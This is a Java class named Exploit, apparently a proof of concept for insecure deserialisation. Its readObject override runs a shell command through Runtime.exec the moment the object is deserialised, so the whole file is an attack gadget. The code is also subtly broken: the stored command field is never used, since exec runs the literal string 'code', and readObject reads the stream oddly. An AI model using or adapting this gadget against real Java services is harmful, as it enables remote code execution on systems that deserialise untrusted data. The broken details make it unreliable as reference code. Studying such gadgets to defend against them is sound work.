import java.io.IOException;
import java.io.Serializable;

public class Exploit extends User implements Runnable, Serializable {
    private String command;

    public Exploit(String command) {
        super("I contain and exploit", 6667);
        this.command = command;

    }
    //readObject implementation, will call the readObject from ObjectInputStream  and then this.run
    //Which is the metod that executes shell commands
    private void readObject(java.io.ObjectInputStream stream)
            throws IOException, ClassNotFoundException {
        stream.readObject();
        this.run();
    }

    @Override
    public void run() {
        try {
            Runtime.getRuntime().exec("code");
        } catch (IOException e) {
            throw new RuntimeException(e);

        }
    }
}